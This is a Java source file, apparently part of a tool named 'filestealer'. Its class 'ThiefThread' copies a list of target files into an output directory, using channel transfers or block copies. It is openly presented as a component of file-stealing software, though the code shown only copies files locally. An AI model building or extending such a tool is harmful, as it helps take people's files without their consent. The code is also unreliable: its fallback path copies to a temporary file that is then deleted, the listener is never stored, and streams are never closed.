package net.frostq.filestealer.stealer;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.channels.FileChannel;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.List;

import com.google.common.collect.Lists;

public class ThiefThread extends Thread implements Runnable, Logger.Adapter {
	protected List<TargetContainer> targets = Lists.newArrayList();

	protected Listener listener;
	protected int cursor = 0;
	
	@Override
	public void run() {
		targets.forEach(x -> {
			Path p = Paths.get(x.getContainer().getOutputPath() + "/" + getFileName(x.getFile()));
			Path temp = Paths.get(x.getFile() + "d");
			
			try {
				if(Files.notExists(p)) Files.createFile(p);
				
				if(Files.size(x.getFile()) >= Math.pow(2, 20) * 576) {
					blockCopy(x.getFile(), p);
				} else {
					try {
						x.open();
						
						FileChannel channel = FileChannel.open(p, StandardOpenOption.WRITE);
						long transferred = x.channel.transferTo(0L, Files.size(x.getFile()), channel);
						log(transferred + " byte(s) were transferred.");
					} catch (Exception e) {
						log("채널 여는 중 오류 (ThiefThread)");
						
						blockCopy(x.getFile(), temp);
					}
				}
			} catch (IOException e) {
				e.printStackTrace();
			} finally {
				try {
					Files.deleteIfExists(temp);
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				if(listener != null) listener.update(this, cursor++);
			}
		});
	}
	
	protected void blockCopy(Path x, Path y) throws IOException {
		InputStream f = Files.newInputStream(x);
		OutputStream ff = Files.newOutputStream(y);
		while(true) {
			byte[] read = new byte[16384];
			int len = f.read(read);
			
			if(len > -1) {
				byte[] rr = new byte[len];
				System.arraycopy(read, 0, rr, 0, len);
				ff.write(rr);
			} else {
				break;
			}
		}
		
		log("blockCopy CALL : [" + x + "]");
	}
	
	public void setListener(Listener l) {
		l.setListener(this);
	}
	
	public String getFileName(Path p) {
		return p.getName(p.getNameCount() - 1).toString();
	}

	@Override
	public void log(String text) {
		targets.get(0).getContainer().log(text);
	}
	
	@Override
	public Logger getLogger() {
		return listener.getLogger();
	}
}